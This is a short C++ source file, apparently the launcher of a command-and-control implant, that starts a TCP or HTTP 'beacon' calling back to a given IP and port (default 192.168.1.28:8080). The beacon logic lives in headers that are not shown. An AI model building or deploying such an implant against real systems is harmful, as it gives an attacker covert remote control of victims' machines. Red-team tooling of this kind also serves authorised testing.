#include "BeaconTcp.hpp"
#include "BeaconHttp.hpp"


using namespace std;


int main(int argc, char* argv[])
{
	if (argc < 2) {
		cout << "BeaconLaucher tcp ip port / BeaconLaucher http url port";
		return -1;
	}

	std::string arg = argv[1];
	
	std::string ip = "192.168.1.28";
	if(argc > 2)
		ip = argv[2];

	int port = 8080;
	if (argc > 3)
		port = atoi(argv[3]);

	if (arg == "tcp")
	{
		BeaconTcp beaconTcp(ip, port);
		beaconTcp.runTcp();
	}
	else if (arg == "http")
	{
		BeaconHttp Beaconhttp(ip, port);
		Beaconhttp.runHttp();
	}
	else
	{
		std::cout << "type " << arg << " unknonwn" << std::endl;
	}
}